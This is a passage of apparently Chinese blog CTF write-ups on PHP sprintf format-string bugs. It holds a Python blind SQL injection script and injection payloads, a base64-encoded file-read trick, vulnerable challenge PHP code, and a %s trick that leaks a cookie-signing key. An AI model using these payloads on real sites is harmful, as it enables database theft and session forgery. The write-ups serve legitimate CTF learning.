<p>所以结果为：<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> foo <span class="keyword">WHERE</span> bar <span class="keyword">IN</span> (<span class="string">''</span>) <span class="keyword">OR</span> <span class="number">1</span> = <span class="number">1</span> <span class="comment">/*) AND baz = 39</span></span><br></pre></td></tr></table></figure></p>
<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><p>i春秋的 “迎圣诞，拿大奖”活动赛题<br><a href="https://www.ichunqiu.com/battalion?t=1&amp;r=60469" target="_blank" rel="noopener">https://www.ichunqiu.com/battalion?t=1&amp;r=60469</a></p>
<p>进行fuzz时 ，当输入<code>%</code>时爆sprintf()错误<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g280yj6qcuj30ul0byglz.jpg" alt=""></p>
<p>于是构造<code>username=admin%1$\&#39; and 1=2#</code>与 <code>username=admin%1$\&#39; and 1=1#</code><br>于是写下脚本：<br><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding : utf-8 _*_</span></span><br><span class="line"><span class="built_in">import</span> requests</span><br><span class="line"><span class="built_in">import</span> re</span><br><span class="line"><span class="built_in">import</span> urllib2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">headers</span> = &#123;</span><br><span class="line">'User-Agent' : 'Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; WOW64; rv:<span class="number">56.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">56.0</span>',</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">dbname</span> = <span class="string">""</span></span><br><span class="line"><span class="attr">chars</span> = '<span class="number">0123456789</span>ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span><br><span class="line"><span class="attr">url</span> = <span class="string">"http://00eec0b6e68b4332b078c559e3fee6307720121e6aaf49e4.changame.ichunqiu.com/"</span></span><br><span class="line">for m <span class="keyword">in</span> range(<span class="number">30</span>,<span class="number">50</span>):</span><br><span class="line">   for i <span class="keyword">in</span> range(<span class="number">32</span>, <span class="number">126</span>):</span><br><span class="line">       <span class="attr">s</span> = <span class="string">"%1$' or ascii(substr((select flag from flag),"</span>+str(m)+<span class="string">",1))="</span>+str(i)+<span class="string">"#"</span></span><br><span class="line">       <span class="comment"># str1 = urllib2.quote(s)</span></span><br><span class="line">       <span class="attr">str1</span> = s</span><br><span class="line">       <span class="attr">data=&#123;'username'</span> : str1, 'password' : '<span class="number">12313</span>'&#125;</span><br><span class="line">       <span class="comment"># print str1</span></span><br><span class="line">       <span class="comment"># print urllib2.unquote(str1)</span></span><br><span class="line">       <span class="attr">req</span> = requests.post(<span class="attr">url=url,</span> <span class="attr">data=data,headers=headers)</span></span><br><span class="line">       <span class="comment"># print req.text</span></span><br><span class="line">       <span class="comment"># print req.text</span></span><br><span class="line">       <span class="attr">result</span> = re.findall('password error', req.content)</span><br><span class="line">       <span class="keyword">if</span> result:</span><br><span class="line">           <span class="attr">dbname</span> = dbname + chr(i)</span><br><span class="line">           print dbname</span><br><span class="line">           print chr(i)</span><br></pre></td></tr></table></figure></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://style-404.github.io/2019/04/19/PHP-sprintf格式化字符串漏洞/" data-id="cjvrp4gik000h5gqrc7pbwwgw" class="article-share-link">Share</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web安全/">web安全</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-2019DDCTF-Writeup" class="article article-type-post" itemscope="" itemprop="blogPost">
  <div class="article-meta">
    <a href="/2019/04/18/2019DDCTF-Writeup/" class="article-date">
  <time datetime="2019-04-18T04:50:59.000Z" itemprop="datePublished">2019-04-18</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/04/18/2019DDCTF-Writeup/">2019DDCTF-Writeup</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="滴"><a href="#滴" class="headerlink" title="滴~"></a>滴~</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1zyra06lfj30wh08i3yy.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1zyt7po9nj30v009dmz4.jpg" alt=""><br>base64-&gt;base64-&gt;hex<br>?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09 = ?jpg=666C61672E6A7067 =flag.php<br>尝试包含index.php<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?<span class="attribute">jpg</span>=TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</span><br></pre></td></tr></table></figure></p>
<p>base64解码得到<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line">/*</span><br><span class="line"> * https://blog.csdn.net/FengBanLiuYun/article/details/80616607</span><br><span class="line"> * Date: July 4,2018</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php">error_reporting(E_ALL || ~E_NOTICE);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(! <span class="keyword">isset</span>($_GET[<span class="string">'jpg'</span>]))</span></span><br><span class="line"><span class="php">    header(<span class="string">'Refresh:0;url=./index.php?jpg=TmpZMlF6WXhOamN5UlRaQk56QTJOdz09'</span>);</span></span><br><span class="line"><span class="php">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'jpg'</span>])));</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'&lt;title&gt;'</span>.$_GET[<span class="string">'jpg'</span>].<span class="string">'&lt;/title&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>,<span class="string">""</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$file = str_replace(<span class="string">"config"</span>,<span class="string">"!"</span>, $file);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> $file.<span class="string">'&lt;/br&gt;'</span>;</span></span><br><span class="line"><span class="php">$txt = base64_encode(file_get_contents($file));</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span>.$txt.<span class="string">"'&gt;&lt;/img&gt;"</span>;</span></span><br><span class="line">/*</span><br><span class="line"> * Can you find the flag file?</span><br><span class="line"> *</span><br><span class="line"><span class="php"> */</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>f1agconfigddctf.php = TmpZek1UWXhOamMyTXpabU5tVTJOalk1TmpjMk5EWTBOak0zTkRZMk1tVTNNRFk0TnpBPQ==<br>解码得到:<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span>(<span class="string">'config.php'</span>);</span></span><br><span class="line"><span class="php">$k = <span class="string">'hello'</span>;</span></span><br><span class="line"><span class="php">extract($_GET);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(<span class="keyword">isset</span>($uid))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">    $content=trim(file_get_contents($k));</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($uid==$content)</span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span> $flag;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">	<span class="keyword">else</span></span></span><br><span class="line"><span class="php">	&#123;</span></span><br><span class="line"><span class="php">		<span class="keyword">echo</span><span class="string">'hello'</span>;</span></span><br><span class="line"><span class="php">	&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<h1 id="WEB-签到题"><a href="#WEB-签到题" class="headerlink" title="WEB 签到题"></a>WEB 签到题</h1><p>考点:<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">sprintf</span><span class="params">()</span></span>格式化字符串漏洞</span><br></pre></td></tr></table></figure></p>
<p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xiygunkj30vz0ctdg5.jpg" alt=""><br>发现调用了Auth.php,并且有个didictf_username参数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xqddfg3j30x30hpdhd.jpg" alt=""><br>访问Auth.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xrev326j30tz0a1t9c.jpg" alt=""><br>当加上didictf_username = admin这个头<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g27xsbpnyaj30u40cfjs5.jpg" alt=""><br>访问 app/fL2XID2i0Cdh.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2820kx99yj30qv0hk0tj.jpg" alt=""><br>其中app/Application.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">Class</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $path = <span class="string">''</span>; <span class="comment">//定义一个公共变量$path</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">response</span><span class="params">($data, $errMsg = <span class="string">'success'</span>)</span> </span>&#123;</span><br><span class="line">        $ret = [<span class="string">'errMsg'</span> =&gt; $errMsg,    <span class="comment">//创建一个php数组，其中从形参获取两个值转化为数组值。</span></span><br><span class="line">            <span class="string">'data'</span> =&gt; $data];</span><br><span class="line">        $ret = json_encode($ret);</span><br><span class="line">        header(<span class="string">'Content-type: application/json'</span>); <span class="comment">//定义http头json内容类型</span></span><br><span class="line">        <span class="keyword">echo</span> $ret;  <span class="comment">//显示数据加密后的json数据</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">auth</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $DIDICTF_ADMIN = <span class="string">'admin'</span>;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>]) &amp;&amp; $_SERVER[<span class="string">'HTTP_DIDICTF_USERNAME'</span>] == $DIDICTF_ADMIN) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'您当前当前权限为管理员----请访问:app/fL2XID2i0Cdh.php'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;response(<span class="string">'抱歉，您没有登陆权限，请获取权限后访问-----'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizepath</span><span class="params">($path)</span> </span>&#123;  <span class="comment">//传入一个变量$path</span></span><br><span class="line">    $path = trim($path);  <span class="comment">//删除$path首位空</span></span><br><span class="line">    $path=str_replace(<span class="string">'../'</span>,<span class="string">''</span>,$path);  <span class="comment">// ../ 替换为 空</span></span><br><span class="line">    $path=str_replace(<span class="string">'..\\'</span>,<span class="string">''</span>,$path); <span class="comment">// ..\\ 替换为 空</span></span><br><span class="line">    <span class="keyword">return</span> $path; <span class="comment">//返回$path</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;path)) &#123;  <span class="comment">// 如果$path为空，就直接结束了</span></span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $path = <span class="keyword">$this</span>-&gt;sanitizepath(<span class="keyword">$this</span>-&gt;path); <span class="comment">// 不为空就调用sanitizepath()做替换</span></span><br><span class="line">        <span class="keyword">if</span>(strlen($path) !== <span class="number">18</span>) &#123;  <span class="comment">//如果处理过的$path长度不严格等于18，就跳出</span></span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">'Congratulations'</span>);</span><br><span class="line">    &#125;   <span class="comment">// 把$path读取出来以后传入response()</span></span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>app/Session.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">'Application.php'</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration			= <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">'ddctf_id'</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain				= <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure				= <span class="keyword">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">"DiDiCTF"</span>;</span><br><span class="line">    <span class="comment">//定义了一堆类变量</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">parent</span>::auth()) &#123; <span class="comment">//HTTP_DIDICTF_USERNAME: admin时才能继续执行</span></span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key(); <span class="comment">//调用get_key()</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123; <span class="comment">//如果session_read()返回为TRUE就进入下面三行</span></span><br><span class="line">                $data = <span class="string">'DiDI Welcome you %s'</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]);</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;<span class="comment">//如果session_read()返回为FLASE，就调用session_create()</span></span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">'DiDI Welcome you'</span>;</span><br><span class="line">                <span class="keyword">parent</span>::response($data,<span class="string">'sucess'</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span><span class="params">()</span> </span>&#123; <span class="comment">// 获取eancrykey，hint: ../config/flag.txt</span></span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">'../config/key.txt'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"session not found"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">"the cookie data not match"</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'session_id'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'ip_address'</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">'user_agent'</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">"nickname"</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">"nickname"</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">"Welcome my friend %s"</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">parent</span>::response($data,<span class="string">"Welcome"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'ip_address'</span>] != $_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the ip addree not match'</span>.<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">'user_agent'</span>] != $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>]) &#123;</span><br><span class="line">            <span class="keyword">parent</span>::response(<span class="string">'the user agent not match'</span>,<span class="string">'error'</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">'session_id'</span> =&gt; md5(uniqid($sessionid,<span class="keyword">TRUE</span>)),</span><br><span class="line">            <span class="string">'ip_address'</span> =&gt; $_SERVER[<span class="string">'REMOTE_ADDR'</span>],</span><br><span class="line">            <span class="string">'user_agent'</span> =&gt; $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>],</span><br><span class="line">            <span class="string">'user_data'</span> =&gt; <span class="string">''</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br></pre></td></tr></table></figure></p>
<p>Application.php里面是一个Application类，有一个为空的公共变量$path，三个公共方法response()、auth()和__destruct()，还有一个私有方法sanitizepath()。</p>
<p>response()方法能把传入的两个数据用json格式化后打印出来，auth()方法进行访问者的权限校验，刚开始的didictf_username就是在此进行校验，还有一个__destruct()，这是析构方法，是在方法中最后一定会执行的函数，这个方法里面的意思就是：如果$path不为空，就把$path用sanitizepath()过滤一下，去除一次../和<code>..\\</code>，然后过滤后的路径的长度如果等于18，就进行读取，再把内容丢给response()方法进行显示。</p>
<p>接下来分析session.php<br>生成一个 32 位的随机session_id字符串，然后$userdata就是最后 Session 中的数据。里面包含了我们的 IP，浏览器 UA 等信息。最后会对这个存有信息的$userdata数据进行 PHP 序列化。同时会把序列化的结果，与密钥$eancrykey拼接，做一次 md5 后拼接在结果后面，起到签名防伪造的效果。<br>最后将整个结果以 Cookie 的形式存在用户本地。加了个$eancrykey做 md5，这确实是个不错的本地存 Cookie 的方法啊</p>
<p>读取的过程其实也就是相反的。首先是检测有没有名为ddctf_id的 Cookie，没有的话就返回FALSE。如果有的话，截取后面 32 位，即那段 md5 的签名。再截取前面的内容，即数据正文。用加密的方式检验一下 Cookie 有没有被篡改。没有的话，就对数据进行 PHP 反序列化。检查数据中的session_id ip_address ip_address元素是否存在。<br>然后判断一下是否传入了名为nickname的 POST 参数，如果有的话，就格式化字符串输出出来。后面还对ip_address和ip_address做了检验。</p>
<p>这里我们传入修改后的 Cookie，都需要用$eancrykey进行检验，因此得想办法得到$eancrykey的值，这样就可以伪造 Cookie 了。<br>其中在get_key() 注释写到 flag和eanccrykey在同一个文件夹<br>因此得想办法得到$eancrykey的值，这样就可以伪造 Cookie 了。</p>
<p>在传入nickname POST 参数时，十分违和地出现了个$eancrykey。这里把<code>$_POST[&quot;nickname&quot;]</code>和$this-&gt;eancrykey放到了同一个数组中，使用foreach循环后再使用了格式化字符串sprintf()。这里想到了一个很机智的方法：我们只需要 POST 请求app/Session.php，传入nickname的值为%s，第一次格式化字符串时，会把”Welcome my friend %s”中的%s换成%s，第二就会把%s换成$this-&gt;eancrykey，这样我们就得到$eancrykey了。</p>
<p>注意，格式化字符串的代码是在session_read()方法里的，因此我们需要先空白请求一次，拿到一个 Cookie，再带着这个 Cookie 请求，这样才能进入session_read()方法。<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2a9yzqwj5j30z00b4wfv.jpg" alt=""><br>解下来获取$eancrykey<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g2aa796vthj30w70ikjun.jpg" alt=""><br>注意: 将get改为post，同时加上Content-Type: application/x-www-form-urlencoded<br>拿到$eancrykey为EzblrbNS</p>
<p>接下来进行反序列化</p>
